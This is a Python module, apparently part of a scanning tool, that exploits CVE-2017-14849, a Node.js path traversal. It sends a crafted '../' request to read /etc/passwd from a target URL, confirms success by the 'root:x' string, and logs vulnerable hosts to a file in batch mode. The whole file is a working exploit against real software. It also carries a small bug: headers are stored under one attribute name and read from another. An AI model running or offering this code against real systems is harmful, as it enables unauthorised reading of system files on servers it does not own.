#! /usr/bin/python3
# -*- encoding: utf-8 -*-

from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import requests

class Cve_2017_14849:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        url2 = url + '/static/../../../a/../../../../etc/passwd'
        try:
            req = requests.get(url2, timeout=3,verify=self.verify,proxies=self.proxy,headers=self.header)
            if "root:x" in req.text:
                OutPrintInfo("Node-JS", f"存在Node-JS任意文件下载 {url2}")
                if self.batch:
                    with open("./result/nodejs_2017_14849.txt","a") as w:
                        w.write(f"{url2}\n")
                return True
            return False
        except Exception:
            if not self.batch:
                OutPrintInfo("Node-JS", "目标请求出错")
            return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        proxy = target["proxy"]
        header = target["header"]
        self.verify = target["ssl"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Node-JS", "开始检测Node-JS任意文件下载...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("Node-JS", "Node-JS任意文件下载检测结束")
